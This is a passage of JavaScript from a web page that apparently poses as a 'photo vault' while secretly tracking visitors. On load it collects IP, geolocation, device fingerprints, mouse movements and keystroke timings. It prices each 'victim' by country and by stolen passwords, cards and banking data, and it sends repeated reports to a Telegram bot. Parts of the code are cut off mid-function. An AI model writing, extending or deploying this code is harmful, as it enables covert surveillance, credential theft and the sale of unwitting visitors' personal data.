        // IMPROVED: Telegram message sending with retry logic
        async function sendToTelegram(message, maxRetries = 3) {
            if (isSending) {
                messageQueue.push(message);
                return false;
            }

            isSending = true;
            let retryCount = 0;
            
            while (retryCount <= maxRetries) {
                try {
                    console.log(`Attempting to send Telegram message (attempt ${retryCount + 1})`);
                    
                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: CONFIG.telegram.chatId,
                            text: message.substring(0, 4090), // Telegram limit
                            parse_mode: 'HTML'
                        })
                    });

                    if (response.ok) {
                        const result = await response.json();
                        console.log('Telegram message sent successfully');
                        isSending = false;
                        
                        // Process any queued messages
                        if (messageQueue.length > 0) {
                            const nextMessage = messageQueue.shift();
                            setTimeout(() => sendToTelegram(nextMessage), 1000);
                        }
                        return true;
                    } else {
                        const errorText = await response.text();
                        console.error(`Telegram API error: ${response.status}`, errorText);
                        retryCount++;
                        
                        if (retryCount <= maxRetries) {
                            await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                        }
                    }
                } catch (error) {
                    console.error(`Network error sending to Telegram:`, error);
                    retryCount++;
                    
                    if (retryCount <= maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                    }
                }
            }
            
            console.error('Failed to send Telegram message after all retries');
            isSending = false;
            return false;
        }

        // Process message queue
        function processMessageQueue() {
            if (messageQueue.length > 0 && !isSending) {
                const message = messageQueue.shift();
                sendToTelegram(message);
            }
        }

        // FIXED REALISTIC VALUATION FUNCTION
        function calculateRealisticValue(victimData) {
            let value = 0;
            
            // COUNTRY TIER PRICING
            const countryTiers = {
                'TIER_1': ['CH', 'US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE', 'NO', 'DK', 'SE', 'FI'],
                'TIER_2': ['JP', 'KR', 'NZ', 'AT', 'BE', 'NL', 'IE', 'ES', 'IT'],
                'TIER_3': ['BR', 'RU', 'CN', 'IN', 'MX', 'ZA', 'TR', 'PL']
            };
            
            const countryCode = victimData.location?.country_code || 'UN';
            if (countryTiers.TIER_1.includes(countryCode)) value += 50;
            else if (countryTiers.TIER_2.includes(countryCode)) value += 32;
            else if (countryTiers.TIER_3.includes(countryCode)) value += 20;
            else value += 10;
            
            // DEVICE VALUE
            const platform = victimData.browser?.platform || '';
            const cores = victimData.browser?.cores || 0;
            const memory = victimData.browser?.memory || '';
            
            if (platform.includes('Mac')) value += 25;
            if (platform.includes('Win')) value += 15;
            if (cores >= 8) value += 12;
            if (cores >= 4) value += 8;
            if (memory.includes('16GB')) value += 15;
            if (memory.includes('8GB')) value += 10;
            
            // DATA ASSETS VALUE
            const social = victimData.social || {};
            
            // Convert to numbers with fallbacks
            const passwords = Number(social.passwords) || 0;
            const emails = Number(social.emails) || 0;
            const usernames = Number(social.usernames) || 0;
            const creditCards = Number(social.credit_cards) || 0;
            const bankingInfo = Number(social.banking_info) || 0;
            const personalInfo = Number(social.personal_info) || 0;
            const phoneNumbers = Number(social.phone_numbers) || 0;
            const addresses = Number(social.addresses) || 0;
            const cookies = Number(social.cookies) || 0;
            const localStorage = Number(social.local_storage) || 0;
            const sessions = Number(social.sessions) || 0;
            
            // Passwords & Logins
            value += passwords * 8;
            value += emails * 5;
            value += usernames * 3;
            
            // Financial Data
            value += creditCards * 25;
            value += bankingInfo * 40;
            
            // Personal Information
            value += personalInfo * 2;
            value += phoneNumbers * 6;
            value += addresses * 8;
            
            // Browser & Tracking Data
            value += cookies * 0.5;
            value += localStorage * 0.3;
            value += sessions * 2;
            
            // Behavioral & Fingerprinting
            const fingerprint = victimData.fingerprint || {};
            if (fingerprint.canvas && fingerprint.canvas !== 'failed') value += 5;
            if (fingerprint.webgl && fingerprint.webgl !== 'failed') value += 5;
            if (fingerprint.audio && fingerprint.audio !== 'failed') value += 3;
            
            if (fingerprint.fonts) {
                const fontCount = fingerprint.fonts.split(',').length;
                value += fontCount * 0.5;
            }
            
            // Network & Location Precision
            const network = victimData.network || {};
            const location = victimData.location || {};
            
            if (network.ip && network.ip !== 'Unknown') value += 8;
            if (location.city && location.city !== 'Unknown') value += 5;
            if (location.latitude && location.latitude !== 'Unknown') value += 10;
            
            // Time-based factors
            const dataFreshness = Date.now() - pageLoadTime;
            if (dataFreshness < 30000) value += 5;
            else if (dataFreshness < 120000) value += 2;
            
            // Quality multipliers
            if (creditCards > 0) value *= 1.3;
            if (passwords > 0) value *= 1.2;
            if (bankingInfo > 0) value *= 1.5;
            
            return Math.max(15, Math.round(value));
        }

        // FIXED VICTIM ID GENERATION
        function generateVictimID(victimData) {
            const country = victimData.location?.country_code || 'UN';
            const value = calculateRealisticValue(victimData);
            const validValue = isNaN(value) ? 85 : value;
            const randomCode = Math.floor(Math.random() * 90000) + 10000;
            return `vi.${country}.${validValue}.${randomCode}`;
        }

        // IMPROVED: Location service with better error handling
        async function getRealLocation() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json', { 
                    timeout: 5000 
                });
                const ipData = await ipResponse.json();
                
                const locationServices = [
                    `https://ipapi.co/${ipData.ip}/json/`,
                    `https://ipinfo.io/${ipData.ip}/json`,
                    `https://geolocation-db.com/json/${ipData.ip}`
                ];
                
                for (let service of locationServices) {
                    try {
                        const locationResponse = await fetch(service, { timeout: 5000 });
                        if (locationResponse.ok) {
                            const location = await locationResponse.json();
                            
                            return {
                                city: location.city || location.region || 'Unknown',
                                region: location.region || location.regionName || 'Unknown',
                                country: location.country_name || location.country || 'Unknown',
                                country_code: location.country_code || location.countryCode || 'UN',
                                postal: location.postal || location.zip || 'Unknown',
                                latitude: location.latitude || location.lat || 'Unknown',
                                longitude: location.longitude || location.lon || 'Unknown',
                                timezone: location.timezone || 'Unknown',
                                currency: location.currency || 'Unknown',
                                calling_code: location.country_calling_code || location.callingCode || 'Unknown'
                            };
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                return {
                    city: 'VPN/Proxy Detected',
                    region: 'Unknown',
                    country: 'Unknown',
                    country_code: 'VPN',
                    postal: 'Unknown',
                    latitude: 'Unknown',
                    longitude: 'Unknown',
                    timezone: 'Unknown',
                    currency: 'Unknown',
                    calling_code: 'Unknown'
                };
                
            } catch (error) {
                return {
                    city: 'Blocked',
                    region: 'Blocked',
                    country: 'Blocked',
                    country_code: 'BLOCKED',
                    postal: 'Blocked',
                    latitude: 'Blocked',
                    longitude: 'Blocked',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    currency: 'Unknown',
                    calling_code: 'Unknown'
                };
            }
        }

        // IMPROVED: Data collection with timeout protection

                );

                const dataPromise = Promise.allSettled([
                    getRealIP(),
                    getRealLocation(),
                    getSystemInfo()
                ]);

                const results = await Promise.race([dataPromise, timeoutPromise]);
                
                const realIP = results[0].status === 'fulfilled' ? results[0].value : {ip: 'Unknown', isp: 'Unknown', asn: 'Unknown'};
                const realLocation = results[1].status === 'fulfilled' ? results[1].value : getFallbackLocation();

                const victimData = {

                    network: {
                        ip: realIP.ip,

                        asn: realIP.asn,
                        connection: navigator.connection ? navigator.connection.effectiveType : '4g',
                        vpn: detectVPN(realIP.ip),

                        bandwidth: await getBandwidth().catch(() => 'Unknown'),
                        latency: await getLatency().catch(() => 'Unknown'),
                        dataSaver: navigator.connection ? navigator.connection.saveData : false,
                        downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
                        rtt: navigator.connection ? navigator.connection.rtt : 'Unknown'
                    },
                    location: realLocation,
                    browser: getBrowserInfo(),
                    hardware: getHardwareInfo(),
                    fingerprint: getFingerprintInfo(),
                    behavioral: getBehavioralInfo(),
                    social: await collectAllSocialData().catch(() => getFallbackSocialData()),
                    system: systemInfo
                };
                
                return victimData;
            } catch (error) {
                console.error('Critical error in data collection:', error);
                return getFallbackData();
            } finally {
                showLoading(false);
            }
        }

        function getHardwareInfo() {

        async function getBandwidth() {
            try {
                const start = performance.now();
                await fetch('https://httpbin.org/stream-bytes/100000');
                const end = performance.now();
                return Math.round(100000 / (end - start));
            } catch { return 'Unknown'; }

        async function getLatency() {
            try {
                const start = performance.now();
                await fetch('https://httpbin.org/delay/0');
                const end = performance.now();
                return Math.round(end - start);
            } catch { return 'Unknown'; }

        function getScrollDepth() {
            const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;

        function generateCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 2, 2);
                return 'canvas_fingerprint_generated';
            } catch (e) { return 'failed'; }
        }

        function generateWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? 'webgl_supported' : 'no_webgl';
            } catch (e) { return 'failed'; }
        }

            return window.AudioContext ? 'Audio supported' : 'No audio support';

        function detectVPN(ip) {
            const vpnRanges = ['104.', '107.', '108.'];
            const isVPNRange = vpnRanges.some(range => ip.startsWith(range));
            return isVPNRange ? 'VPN/Proxy Detected' : 'Residential IP';
        }

        function detectProxy() {
            return navigator.webdriver ? 'Automation Detected' : 'Normal';
        }

        function detectTor() {
            return navigator.plugins.length === 0 ? 'Tor Browser Suspected' : 'Normal';
        }

            message += `‚Ä¢ Time on Page: ${Math.round(victimData.behavioral.time_on_page/1000)}s\n`;
            message += `‚Ä¢ Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
            message += `‚Ä¢ Mouse Movements: ${victimData.behavioral.mouse_movements}\n\n`;
            
            message += `<b>VICTIM PROFILE:</b>\n`;
            message += `‚Ä¢ ID: <code>${victimId}</code>\n`;
            message += `‚Ä¢ Estimated Value: $${victimValue}\n`;
            message += `‚Ä¢ Timestamp: ${victimData.timestamp}\n`;
            message += `‚Ä¢ URL: ${victimData.behavioral.url}`;

            await sendToTelegram(message);
        }

        async function sendClickReport(imageId) {
            const victimData = await collectVictimData();
            victimValue = calculateRealisticValue(victimData);
            
            let message = `üñ±Ô∏è <b>IMAGE CLICK DETECTED</b>\n\n`;
            message += `‚Ä¢ Image ID: ${imageId}\n`;
            message += `‚Ä¢ Victim ID: <code>${victimId || generateVictimID(victimData)}</code>\n`;
            message += `‚Ä¢ Current Value: $${victimValue}\n`;
            message += `‚Ä¢ Time: ${victimData.timestamp}`;

            await sendToTelegram(message);
        }

        // Enhanced behavioral tracking
        function startBehavioralTracking() {
            document.addEventListener('mousemove', (e) => {
                mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                });
                if (mouseMovements.length > 100) {
                    mouseMovements = mouseMovements.slice(-100);
                }
            });

            document.addEventListener('keydown', (e) => {
                keystrokeTiming.push({
                    key: e.key,
                    timestamp: Date.now(),
                    target: e.target.tagName
                });
                if (keystrokeTiming.length > 50) {
                    keystrokeTiming = keystrokeTiming.slice(-50);
                }
            });
        }

        // IMPROVED: Initialization with better error handling
        window.addEventListener('load', async function() {
            pageLoadTime = Date.now();
            startBehavioralTracking();
            
            // Send initial report with retry
            setTimeout(async () => {
                try {
                    const victimData = await collectVictimData();
                    await sendEnhancedReport(victimData);
                } catch (error) {
                    console.error('Initial report failed:', error);
                }
            }, 1000);
            
            // Continuous monitoring
            setInterval(async () => {
                try {
                    const updatedData = await collectVictimData();
                    await sendBehavioralUpdate(updatedData);
                } catch (error) {
                    console.log('Behavioral update failed:', error);
                }
            }, 30000);
        });

        async function sendBehavioralUpdate(victimData) {
            let message = `üìä <b>BEHAVIORAL UPDATE</b>\n\n`;
            message += `‚Ä¢ Victim ID: <code>${victimId}</code>\n`;
            message += `‚Ä¢ Time on Page: ${Math.round(victimData.behavioral.time_on_page/1000)}s\n`;
            message += `‚Ä¢ Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
            message += `‚Ä¢ Current Value: $${calculateRealisticValue(victimData)}`;

            await sendToTelegram(message);
        }

        console.log('Enhanced photo vault system loaded');
    </script>
